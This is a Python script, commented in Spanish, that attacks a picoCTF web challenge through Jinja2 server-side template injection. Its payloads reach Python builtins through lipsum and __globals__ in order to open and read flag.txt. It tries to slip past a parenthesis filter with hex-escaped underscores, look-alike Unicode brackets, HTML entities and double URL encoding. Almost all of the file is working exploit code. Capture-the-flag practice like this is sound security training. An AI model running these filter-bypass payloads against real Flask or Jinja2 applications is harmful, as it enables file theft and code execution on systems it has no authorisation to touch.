#!/usr/bin/env python3
import requests

url = "http://shape-facility.picoctf.net:56059/"

print("=== Unicode/Alternative Character Bypass ===\n")

# Caracteres que se parecen a paréntesis o pueden funcionar como ellos
alternatives = [
    # Unicode fullwidth
    ("（", "）"),  # U+FF08, U+FF09
    
    # Mathematical
    ("⦅", "⦆"),  # U+2985, U+2986
    ("⟮", "⟯"),  # U+27EE, U+27EF
    ("⸨", "⸩"),  # U+2E28, U+2E29
    
    # Brackets alternatives
    ("［", "］"),  # Fullwidth square brackets
    ("｛", "｝"),  # Fullwidth curly brackets
    ("﹙", "﹚"),  # Small parentheses
    ("（", "）"),  # Fullwidth parentheses
    
    # Other tricks
    ("❨", "❩"),  # U+2768, U+2769
    ("❪", "❫"),  # U+276A, U+276B
    ("⁽", "⁾"),  # Superscript
    ("₍", "₎"),  # Subscript
]

for open_p, close_p in alternatives:
    payload = f"{{{{lipsum|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f'){open_p}'\\x5f\\x5fbuiltins\\x5f\\x5f'{close_p}|attr('\\x5f\\x5fgetitem\\x5f\\x5f'){open_p}'open'{close_p}{open_p}'flag.txt'{close_p}|attr('read'){open_p}{close_p}}}}}"
    
    response = requests.post(url, data={"content": payload})
    
    if "picoctf" in response.text.lower():
        print(f"✓ FLAG FOUND with {repr(open_p)}, {repr(close_p)}!")
        print(f"Flag: {response.text}")
        break
    elif "500" not in response.text and len(response.text) > 100:
        print(f"⚠ Interesting response with {repr(open_p)}, {repr(close_p)}")
    else:
        print(f"✗ No luck with {repr(open_p)}, {repr(close_p)}")

print("\n[2] Probando con caracteres de control...")

# Caracteres de control que podrían no estar filtrados
control_chars = [
    ("\\x28", "\\x29"),  # Hex directo
    ("\\050", "\\051"),  # Octal
    ("\u0028", "\u0029"),  # Unicode escape
    ("&#40;", "&#41;"),  # HTML entities
    ("&lpar;", "&rpar;"),  # HTML named entities
]

for open_p, close_p in control_chars:
    payload = f"{{{{lipsum|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f'){open_p}'\\x5f\\x5fbuiltins\\x5f\\x5f'{close_p}}}}}"
    
    response = requests.post(url, data={"content": payload})
    
    if "builtins" in response.text.lower() or "module" in response.text.lower():
        print(f"✓ {open_p}, {close_p} might work!")

print("\n[3] Probando double encoding...")

# A veces el double encoding funciona
payload = "%257B%257Blipsum%257Cattr%2528%2527%255C%2578%255F%255F%2567%256C%256F%2562%2561%256C%2573%255C%2578%255F%255F%2527%2529%257D%257D"
response = requests.post(url, data=f"content={payload}", headers={"Content-Type": "application/x-www-form-urlencoded"})
if "globals" in response.text.lower():
    print("✓ Double encoding works!")

print("\n[4] Probando con request.args creativamente...")

# Tal vez podemos usar request.args de forma más creativa
test_url = url + "?p1=(&p2=)"
payload = "{{lipsum|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')|attr('\x5f\x5fstr\x5f\x5f')|attr('replace')|attr('\x5f\x5fcall\x5f\x5f')}}"
response = requests.post(test_url, data={"content": payload})
print(f"Creative request.args: {response.text[:200] if '500' not in response.text else 'Error'}")

print("\n" + "="*50)